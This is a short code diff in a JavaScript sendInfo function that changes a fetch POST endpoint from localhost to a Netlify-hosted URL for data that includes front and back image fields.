@@ -213,7 +213,7 @@ const sendInfo = async () => {
       frontImg: front,
       backImg: back,
     };
-      fetch("https://localhost:5000/data", {
+      fetch("https://firmascecapia.netlify.app/data", {
         method: "POST",
         headers: {
           "Content-Type": "application/json",
